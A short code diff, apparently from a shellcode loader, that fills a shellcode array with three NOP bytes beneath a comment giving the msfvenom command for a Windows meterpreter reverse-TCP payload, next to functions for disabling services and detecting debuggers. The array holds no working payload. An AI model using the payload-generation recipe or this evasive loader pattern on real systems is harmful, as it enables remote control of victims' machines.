@@ -92,7 +92,9 @@ static NTSTATUS disableService(const wchar_t* serviceName) {
 
 unsigned char shellcode[] = {
     // msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f csharp -b "\x00\x0a\x0d" EXITFUNC=thread 
-
+    0x90,
+    0x90,
+    0x90
 };
 
 static bool isDebuggerPresent() {
